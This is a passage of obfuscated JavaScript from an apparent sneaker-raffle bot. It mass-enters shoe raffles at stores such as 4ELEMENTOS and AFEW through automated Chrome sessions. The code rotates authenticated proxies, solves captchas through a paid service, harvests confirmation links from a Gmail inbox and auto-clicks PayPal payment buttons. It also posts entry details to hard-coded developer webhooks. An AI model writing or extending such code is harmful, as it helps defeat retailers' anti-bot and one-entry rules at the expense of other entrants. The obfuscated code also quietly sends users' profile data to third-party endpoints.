                                        _0x2a1448['push'](_0x13be60);
                                    }
                                });
                            }), _0x13f6f0['once']('end', function () {
                            });
                        }), _0x23b1ad['once']('error', function (_0x51b67f) {
                            console['log']('Fetch\x20error:\x20' + _0x51b67f);
                        }), _0x23b1ad['once']('end', function () {
                            _0x35b6c1['end']();
                        });
                    }
                });
            });
        }), _0x35b6c1['once']('error', function (_0x22b2ec) {
            console['log'](_0x4e59da['red'](_0x22b2ec['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x35b6c1['once']('end', async function () {
        }), _0x35b6c1['connect']();
    }
    try {
        _0x291b6b(), await _0x505897(0xfa0), console['log']('Found\x20' + _0x2a1448['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x505897(0xfa0);
    }
    var _0x39f14b;
    _0x4041fe('' + _0x14282b);
    var _0x2ba1e6 = _0x17e624[0x0]['split'](':'), _0x4a17cf;
    try {
        _0x4a17cf = await _0x367f42['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2ba1e6[0x0] + ':' + _0x2ba1e6[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x4a17cf = await _0x367f42['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2ba1e6[0x0] + ':' + _0x2ba1e6[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x3b5c2b() + '\x20[' + _0x14282b + ']\x20Getting\x20Session');
        const _0x57b917 = await _0x4a17cf['newPage']();
        await _0x57b917['authenticate']({
            'username': '' + _0x2ba1e6[0x2],
            'password': '' + _0x2ba1e6[0x3]
        }), await _0x57b917['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x57b917, await _0x57b917['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x3b5c2b() + '\x20[' + _0x14282b + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x57b917['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x3b5c2b() + '\x20[' + _0x14282b + ']\x20Successfully\x20logged\x20in'), await _0x505897(0x2710);
        } catch (_0x69e03e) {
            throw new Error('Login\x20session\x20expired\x20' + _0x69e03e);
        }
        for (var _0x3d11ec = 0x0; _0x3d11ec < _0x2a1448['length']; _0x3d11ec++) {
            console['log'](_0x3b5c2b() + '\x20[' + _0x14282b + ']\x20Task\x20' + (_0x3d11ec + 0x1) + '\x20:\x20Starting\x20Verification'), _0x4041fe(_0x14282b + '\x20Task\x20' + (_0x3d11ec + 0x1) + '\x20/\x20' + _0x2a1448['length']);
            const _0x5e79c3 = await _0x4a17cf['newPage']();
            await _0x5e79c3['goto']('' + _0x2a1448[_0x3d11ec], { 'waitUntil': 'networkidle2' }), await _0x505897(0xbb8);
            try {
                const _0x5d9825 = await _0x5e79c3['$']('#challenge-heading');
                _0x5d9825 && (console['log'](_0x3b5c2b() + '\x20[' + _0x14282b + ']\x20Task\x20' + (_0x3d11ec + 0x1) + '\x20:\x20' + _0x4e59da['yellow']('2FA\x20Required')), await _0x5e79c3['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x505897(0x9c40), await _0x5e79c3['waitForSelector']('#payment-submit-btn'), await _0x5e79c3['$eval']('#payment-submit-btn', _0x5b2e7d => _0x5b2e7d['click']()), await _0x5e79c3['click']('#payment-submit-btn');
                try {
                    await _0x5e79c3['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x505897(0x5dc), console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x14282b + ']\x20Task\x20' + (_0x3d11ec + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x29517a) {
                    _0x27ea73 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x29517a['message']);
                } finally {
                    if (_0x27ea73 == 'yes' && _0x3655db != 0x2) {
                        console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x14282b['name'] + ']\x20Task\x20' + (_0x3d11ec + 0x1) + '\x20:\x20Retrying\x20(' + _0x3655db + '\x20/\x205)')), _0x3d11ec = _0x3d11ec - 0x1, _0x3655db = _0x3655db + 0x1;
                        continue;
                    }
                    _0x27ea73 == 'yes' && _0x3655db >= 0x2 && (_0x260c2d(csv[_0x3d11ec], _0x14282b), _0x27ea73 = 'no', _0x3655db = 0x0), await _0x5e79c3['close'](), await _0x505897(0x4650);
                }
            } catch (_0x3c2836) {
                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x14282b + ']\x20Task\x20' + (_0x3d11ec + 0x1) + '\x20:\x20' + _0x3c2836));
            }
        }
    } catch (_0x2f8c8a) {
        console['log'](_0x4e59da['red']('' + _0x2f8c8a));
    } finally {
        await _0x4a17cf['close']();
    }
}
const _0x5f28dd = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x377284, _0x4ddb82, _0x41be6c) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x36d30b = 0x0; _0x36d30b < _0x4ddb82['length']; _0x36d30b++) {
                        if (_0x5044a6 != 'yes')
                            var _0x5044a6 = '', _0x3fdefc = 0x0;
                        var _0x29e3e2;
                        try {
                            await _0x43797b(_0x4ddb82, _0x36d30b);
                        } catch {
                            _0x5044a6 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x4041fe(_0x377284['name'] + '\x20Task\x20' + (_0x36d30b + 0x1) + '\x20/\x20' + _0x4ddb82['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        var _0x5cb7a7 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x1f8ab9 = Math['round'](Math['random']() * (_0x5cb7a7['length'] - 0x1));
                        _0x4ddb82[_0x36d30b]['Size'] == 'RANDOM' && (_0x4ddb82[_0x36d30b]['Size'] = _0x5cb7a7[_0x1f8ab9]);
                        var _0x412430 = Math['round'](Math['random']() * (_0x41be6c['length'] - 0x1)), _0x524de8 = _0x41be6c[_0x412430]['split'](':'), _0x174650;
                        try {
                            _0x174650 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x524de8[0x0] + ':' + _0x524de8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x174650 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x524de8[0x0] + ':' + _0x524de8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x3b5c2b() + '\x20[' + _0x377284['name'] + ']\x20Task\x20' + (_0x36d30b + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x124d1c = await _0x174650['newPage']();
                            await _0x124d1c['authenticate']({
                                'username': '' + _0x524de8[0x2],
                                'password': '' + _0x524de8[0x3]
                            }), await _0x124d1c['setRequestInterception'](!![]), _0x124d1c['on']('request', _0x3efe7f => {
                                _0x3efe7f['resourceType']() === 'image' || _0x3efe7f['resourceType']() === 'font' || _0x3efe7f['resourceType']() === 'media' ? _0x3efe7f['abort']() : _0x3efe7f['continue']();
                            }), await _0x124d1c['goto'](_0x4ddb82[_0x36d30b]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3b5c2b() + '\x20[' + _0x377284['name'] + ']\x20Task\x20' + (_0x36d30b + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x124d1c['waitForSelector']('#accept-all-gdpr'), await _0x124d1c['click']('#accept-all-gdpr'), await _0x124d1c['waitForSelector']('#raffles-product'), await _0x505897(0x3e8), await _0x124d1c['$eval']('#raffles-product', _0x26a0bd => _0x26a0bd['click']()), await _0x505897(0x1388), await _0x124d1c['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x1c9a27 = await _0x124d1c['$']('.fancybox-inner\x20>\x20iframe'), _0x47aaa9 = await _0x1c9a27['contentFrame']();
                            console['log'](_0x3b5c2b() + '\x20[' + _0x377284['name'] + ']\x20Task\x20' + (_0x36d30b + 0x1) + '\x20:\x20Checking\x20Information'), await _0x47aaa9['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x505897(0x1f4), await _0x47aaa9['type']('input[name=\x22sm-form-email\x22]', _0x4ddb82[_0x36d30b]['Email']), await _0x505897(0xc8), await _0x47aaa9['type']('input[name=\x22sm-form-name\x22]', _0x4ddb82[_0x36d30b]['FirstName'] + '\x20' + _0x4ddb82[_0x36d30b]['LastName']), await _0x505897(0xc8), await _0x47aaa9['type']('input[name=\x22sm-form-street\x22]', _0x4ddb82[_0x36d30b]['Address1'] + '\x20' + _0x4ddb82[_0x36d30b]['HouseNumber'] + '\x20' + _0x4ddb82[_0x36d30b]['Address2']), await _0x505897(0xc8), await _0x47aaa9['type']('input[name=\x22sm-form-city\x22]', _0x4ddb82[_0x36d30b]['City']), await _0x505897(0xc8), await _0x47aaa9['type']('input[name=\x22sm-form-province\x22]', _0x4ddb82[_0x36d30b]['State']), await _0x505897(0xc8), await _0x47aaa9['type']('input[name=\x22sm-form-zip\x22]', _0x4ddb82[_0x36d30b]['Zip']), await _0x505897(0xc8), await _0x47aaa9['type']('input[name=\x22sm-form-country\x22]', _0x4ddb82[_0x36d30b]['Country']), await _0x505897(0xc8), await _0x47aaa9['type']('input[name=\x22sm-form-phone\x22]', _0x4ddb82[_0x36d30b]['Phone']), await _0x505897(0xc8), await _0x47aaa9['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x4ddb82[_0x36d30b]['Follower']), await _0x505897(0xc8), await _0x47aaa9['type']('input[name=\x22sm-cst.size\x22]', _0x4ddb82[_0x36d30b]['Size']), await _0x505897(0x1f4), await _0x47aaa9['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x505897(0x1f4), await _0x47aaa9['click']('.icheckbox_simple-custom'), await _0x505897(0x1f4), console['log'](_0x3b5c2b() + '\x20[' + _0x377284['name'] + ']\x20Task\x20' + (_0x36d30b + 0x1) + '\x20:\x20Sending\x20Request'), await _0x47aaa9['$eval']('form', _0x2821a6 => _0x2821a6['submit']()), console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x377284['name'] + ']\x20Task\x20' + (_0x36d30b + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x5044a6 = '';
                            var _0x3658df = await _0x429bf8(_0x4ddb82[_0x36d30b], _0x377284, 'dev', ![]), _0xe9dae0 = await _0x429bf8(_0x4ddb82[_0x36d30b], _0x377284, 'pub', ![]);
                            const _0x3c30c2 = {
                                'succesDEVMSG': { 'embeds': [_0x3658df] },
                                'succesPUBMSG': { 'embeds': [_0xe9dae0] }
                            };
                            try {
                                _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x3c30c2['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x3c30c2['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x1b595f, _0x3c30c2['succesPUBMSG']);
                            } catch (_0x1788e4) {
                                console['log'](_0x4e59da['yellow'](_0x3b5c2b() + '\x20[' + _0x377284['name'] + ']\x20Task\x20' + (_0x36d30b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1788e4));
                            }
                        } catch (_0x366104) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x377284['name'] + ']\x20Task\x20' + (_0x36d30b + 0x1) + '\x20:\x20' + _0x366104)), _0x29e3e2 = '' + _0x366104;
                            var _0x3ca09b = await _0x429bf8(_0x4ddb82[_0x36d30b], _0x377284, 'dev', !![], _0x29e3e2), _0x3658df = await _0x429bf8(_0x4ddb82[_0x36d30b], _0x377284, 'dev', ![]), _0xe9dae0 = await _0x429bf8(_0x4ddb82[_0x36d30b], _0x377284, 'pub', ![]);
                            const _0xd5155d = {
                                'succesDEVMSG': { 'embeds': [_0x3658df] },
                                'succesPUBMSG': { 'embeds': [_0xe9dae0] }
                            };
                            _0xd5155d['errorDEV'] = { 'embeds': [_0x3ca09b] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0xd5155d['errorDEV']), await _0x1abce0(_0x3b044a, _0xd5155d['errorDEV']), _0x366104 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5044a6 = 'yes');
                        } finally {
                            _0x174650['close']();
                            if (_0x5044a6 == 'yes' && _0x3fdefc != 0x5 && _0x29e3e2 != 'Size\x20Not\x20Found') {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x377284['name'] + ']\x20Task\x20' + (_0x36d30b + 0x1) + '\x20:\x20Retrying\x20(' + _0x3fdefc + '\x20/\x205)\x20')), _0x36d30b = _0x36d30b - 0x1, _0x3fdefc = _0x3fdefc + 0x1;
                                continue;
                            }
                            _0x5044a6 == 'yes' && _0x3fdefc >= 0x5 && (_0x260c2d(_0x4ddb82[_0x36d30b], _0x377284), _0x5044a6 = 'no', _0x3fdefc = 0x0), console['log'](_0x3b5c2b() + '\x20[' + _0x377284['name'] + ']\x20Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0xacc8a6, _0x587562) {
                    var _0xc1d9d9 = [];
                    async function _0x514413() {
                        var _0x285612 = new _0x196441({
                            'user': _0x4acd48['masterMail'],
                            'password': _0x4acd48['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x368544(_0x1b6b77) {
                            _0x285612['openBox']('INBOX', ![], _0x1b6b77);
                        }
                        _0x285612['once']('ready', function () {
                            _0x368544(function (_0x42f882, _0x409862) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x42f882)
                                    throw _0x42f882;
                                _0x285612['seq']['search'](['UNSEEN'], function (_0x57ac04, _0x333f3a) {
                                    if (!_0x333f3a || !_0x333f3a['length'])
                                        console['log'](_0x3b5c2b() + '\x20[' + _0xacc8a6['name'] + ']\x20No\x20mails\x20found'), _0x285612['end']();
                                    else {
                                        var _0xae0cb9 = _0x285612['seq']['fetch'](_0x333f3a, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xae0cb9['on']('message', function (_0x510891, _0x401217) {
                                            var _0x1abc20 = '(#' + _0x401217 + ')\x20';
                                            _0x510891['on']('body', function (_0x348e25, _0x5bfb12) {
                                                _0x158053(_0x348e25, (_0x4dd76a, _0x433863) => {
                                                    if (_0x433863['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x361d8c = _0x433863['html']['split']('\x0a');
                                                        for (var _0x4f5414 = 0x0; _0x4f5414 < _0x361d8c['length']; _0x4f5414++) {
                                                            if (_0x361d8c[_0x4f5414]['includes']('salesmanago') && _0x361d8c[_0x4f5414]['includes']('<td') && _0x361d8c[_0x4f5414]['includes']('href')) {
                                                                var _0xccd8e = _0x361d8c[_0x4f5414]['split']('href=\x22'), _0x533637 = _0xccd8e[0x1]['split']('\x22')[0x0];
                                                                _0xc1d9d9['push'](_0x533637);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x510891['once']('end', function () {
                                            });
                                        }), _0xae0cb9['once']('error', function (_0x4ebf37) {
                                            console['log']('Fetch\x20error:\x20' + _0x4ebf37);
                                        }), _0xae0cb9['once']('end', function () {
                                            _0x285612['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x285612['once']('error', function (_0x29c1f4) {
                            console['log'](_0x4e59da['red'](_0x29c1f4['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x285612['once']('end', async function () {
                        }), _0x285612['connect']();
                    }
                    async function _0x3f11d8(_0x377208, _0x2fa6bb, _0x4c493b) {
                        for (var _0xd60c41 = 0x0; _0xd60c41 < _0x2fa6bb['length']; _0xd60c41++) {
                            async function _0x4bb6a5(_0x4b747b, _0x5e8a76, _0x280f09, _0x31eef2, _0x49e866) {
                                var _0x2708db, _0xb48e0d = {}, _0x1f6613 = [], _0x5b85b0 = {}, _0x267170 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x53feff = Math['round'](Math['random']() * (_0x267170['length'] - 0x1));
                                _0x31eef2[_0x4b747b]['Size'] == 'RANDOM' && (_0x31eef2[_0x4b747b]['Size'] = _0x267170[_0x53feff]);
                                !_0x31eef2 && (_0x31eef2 = {});
                                if (_0x4acd48['useRandomProxy'] = ![])
                                    var _0x383381 = _0x49e866[_0x4b747b]['split'](':');
                                else
                                    var _0x3fa09d = Math['round'](Math['random']() * (_0x49e866['length'] - 0x1)), _0x383381 = _0x49e866[_0x3fa09d]['split'](':');
                                var _0x13f355 = {
                                    'jar': _0x433f70,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x280f09['url'],
                                    'headers': _0x280f09['headers'],
                                    'body': JSON['stringify'](_0xb48e0d),
                                    'proxy': 'http://' + _0x383381[0x2] + ':' + _0x383381[0x3] + '@' + _0x383381[0x0] + ':' + _0x383381[0x1]
                                };
                                return _0x5e8a76 != 'ver' && (_0x13f355['url'] = _0x280f09['url'], _0x13f355['headers'] = _0x280f09['headers']), _0x5e8a76 == 'ver' && (_0x13f355['method'] = 'GET', _0x13f355['url'] = _0x31eef2[_0x4b747b]), new Promise(function (_0x4cd930, _0x43a136) {
                                    callback = async (_0x566e80, _0x5e2758, _0x342085) => {
                                        if (!_0x566e80 && _0x5e2758['statusCode'] == 0xca || !_0x566e80 && _0x5e2758['statusCode'] == 0xc8) {
                                            if (_0x5e8a76 != 'ver') {
                                                var _0x53d13f = await _0x429bf8(_0x31eef2[_0x4b747b], _0x280f09, 'dev', ![]), _0x8d8c23 = await _0x429bf8(_0x31eef2[_0x4b747b], _0x280f09, 'pub', ![]);
                                                const _0x2907e7 = {
                                                    'succesDEVMSG': { 'embeds': [_0x53d13f] },
                                                    'succesPUBMSG': { 'embeds': [_0x8d8c23] }
                                                };
                                                if (_0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '')
                                                    try {
                                                        await _0x1abce0(_0x4acd48['webhook'], _0x2907e7['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x2907e7['succesDEVMSG']), await _0x505897(0xc8);
                                                try {
                                                    await _0x1abce0(_0x1b595f, _0x2907e7['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x11df74(_0x31eef2[_0x4b747b], _0x280f09);
                                            }
                                            _0x4cd930(console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x280f09['name'] + ']\x20Task\x20' + (_0x4b747b + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5e8a76 != 'ver') {
                                                var _0x54a571 = '' + _0x566e80, _0x1dfeb8 = await _0x429bf8(_0x31eef2[_0x4b747b], _0x280f09, 'dev', !![], _0x54a571), _0xb51a57 = {};
                                                _0xb51a57['errorDEV'] = { 'embeds': [_0x1dfeb8] }, _0x260c2d(_0x31eef2[_0x4b747b], _0x280f09), _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0xb51a57['errorDEV']), await _0x1abce0(_0x3b044a, _0xb51a57['errorDEV']);
                                            }
                                            _0x43a136(console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x280f09['name'] + ']\x20Task\x20' + (_0x4b747b + 0x1) + ':\x20' + _0x566e80)));
                                        }
                                    };
                                    try {
                                        _0x5e8a76 != 'ver' ? console['log'](_0x3b5c2b() + '\x20[' + _0x280f09['name'] + ']\x20Task\x20' + (_0x4b747b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xb48e0d['data']['attributes']['email']) : console['log'](_0x3b5c2b() + '\x20[' + _0x280f09['name'] + ']\x20Task\x20' + (_0x4b747b + 0x1) + ':\x20Fetching\x20Response'), _0x1d169b(_0x13f355, callback);
                                    } catch (_0x3dec00) {
                                        console['log'](_0x3b5c2b() + '\x20Task\x20' + (_0x4b747b + 0x1) + ':\x20' + _0x3dec00);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4bb6a5(_0xd60c41, 'ver', _0x377208, _0x2fa6bb, _0x4c493b), console['log'](_0x3b5c2b() + '\x20[' + _0x377208['name'] + ']\x20Sleeping\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                            } catch (_0x5636bf) {
                            }
                        }
                    }
                    try {
                        _0x514413(), await _0x505897(0xfa0), console['log']('Found\x20' + _0xc1d9d9['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x3f11d8(_0xacc8a6, _0xc1d9d9, _0x587562);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x71e6b3, _0x321418, _0x508102) {
                for (var _0x32a7fc = 0x0; _0x32a7fc < _0x321418['length']; _0x32a7fc++) {
                    _0x4acd48['AfewDelay'] = _0x4acd48['delay'];
                    var _0x2f0fce;
                    if (_0xad5708 != 'yes')
                        var _0xad5708 = '', _0xb8987c = 0x0;
                    var _0x5c492e = _0x321418[_0x32a7fc]['Url'], _0x3c7534 = _0x321418[_0x32a7fc];
                    _0x4041fe(_0x71e6b3['name'] + '\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20/\x20' + _0x321418['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                    try {
                        await _0x43797b(_0x321418, _0x32a7fc);
                    } catch {
                        _0xad5708 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x1a042e(_0x174389) {
                        const _0x1e5307 = _0x5d8933['readFileSync']('../successful-tasks.csv', 'utf8'), _0x76f982 = _0x4d4612['parse'](_0x1e5307, { 'header': !![] })['data'];
                        let _0x182bd5 = ![];
                        for (var _0x375cdc of _0x76f982) {
                            if (_0x375cdc['Url'] == _0x174389['Url'] && _0x375cdc['Email'] == _0x174389['Email']) {
                                _0x182bd5 = !![];
                                break;
                            }
                        }
                        return _0x182bd5;
                    }
                    if (await _0x1a042e(_0x321418[_0x32a7fc]) == !![]) {
                        console['log'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x58d7aa = await _0x429bf8(_0x321418[_0x32a7fc], _0x71e6b3, 'dev', ![]), _0x1d9d3e = await _0x429bf8(_0x321418[_0x32a7fc], _0x71e6b3, 'pub', ![]);
                    const _0x2d2f0d = {
                        'succesDEVMSG': { 'embeds': [_0x58d7aa] },
                        'succesPUBMSG': { 'embeds': [_0x1d9d3e] }
                    };
                    if (_0x321418[_0x32a7fc]['Email'] == '' || _0x321418[_0x32a7fc]['FirstName'] == '' || _0x321418[_0x32a7fc]['LastName'] == '' || _0x321418[_0x32a7fc]['Country'] == '' || _0x321418[_0x32a7fc]['Size'] == '' || _0x321418[_0x32a7fc]['Address1'] == '' || _0x321418[_0x32a7fc]['Zip'] == '') {
                        console['log'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4acd48['useRandomProxy'] = ![])
                        var _0x4b15e0 = _0x508102[_0x32a7fc]['split'](':');
                    else
                        var _0x312fad = Math['round'](Math['random']() * (_0x508102['length'] - 0x1)), _0x4b15e0 = _0x508102[_0x312fad]['split'](':');
                    var _0x446282;
                    try {
                        _0x446282 = await _0x367f42['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4b15e0[0x0] + ':' + _0x4b15e0[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x446282 = await _0x367f42['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4b15e0[0x0] + ':' + _0x4b15e0[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x53bf14 = JSON['parse'](_0x5d8933['readFileSync']('sizes.json', 'utf-8')), _0x5c492e = _0x321418[_0x32a7fc]['Url'], _0x462ffa = _0x321418[_0x32a7fc]['Size'], _0x10d43e;
                        async function _0x371d5a() {
                            var _0x4ce1f7 = new _0x168885['CookieJar']();
                            console['log'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x44e826;
                            let _0x32b25a = {
                                'method': 'GET',
                                'cookieJar': _0x4ce1f7,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x4b15e0[0x2] + ':' + _0x4b15e0[0x3] + '@' + _0x4b15e0[0x0] + ':' + _0x4b15e0[0x1]
                            }, _0x1ac97f = _0x5c492e['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x1e008a = _0x1ac97f + '.json', _0x5ae14f = await _0x577975(_0x1e008a);
                            console['log'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x119cd5 = _0x5ae14f['data']['product']['variants'];
                            if (_0x462ffa != 'RANDOM') {
                                if (_0x119cd5[0x1]['option1']['includes']('W')) {
                                    const _0xfe6957 = _0x53bf14['women']['find'](_0x41a5ff => _0x41a5ff['EUsize'] === _0x462ffa);
                                    _0xfe6957 && (_0x462ffa = _0xfe6957['size']);
                                } else {
                                    if (_0x119cd5[0x1]['option1']['includes']('Y')) {
                                        const _0x7153de = _0x53bf14['GS']['find'](_0x150772 => _0x150772['EUsize'] === _0x462ffa);
                                        _0x7153de && (_0x462ffa = _0x7153de['size']);
                                    } else {
                                        const _0x1e7763 = _0x53bf14['men']['find'](_0x5e0fc1 => _0x5e0fc1['EUsize'] === _0x462ffa);
                                        _0x1e7763 && (_0x462ffa = _0x1e7763['size']);
                                    }
                                }
